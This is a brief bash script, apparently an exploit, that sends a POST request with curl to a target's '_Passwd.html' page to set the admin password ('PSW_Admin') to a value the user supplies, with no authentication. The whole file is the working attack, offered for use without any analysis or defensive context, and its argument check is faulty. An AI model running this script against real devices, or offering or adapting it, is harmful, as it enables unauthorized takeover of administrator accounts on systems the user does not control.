#!/bin/bash

# Ensure the user provided input
if [ -z "$1" ]; then
  if [ -z "$2" ]; then
    echo "Usage: ./exploit.sh <url> admin_password"
    exit 1
  fi
fi

# Ensure the URL ends with a '/'
url="$1"
if [[ "$url" != */ ]]; then
  url="$url/"
fi
adminpassword="$2"
# Execute curl with the provided input
#echo "${url}_Passwd.html" 'PSW_Admin='$2
curl "${url}_Passwd.html" -X POST  --data-raw 'PSW_Admin='$2 
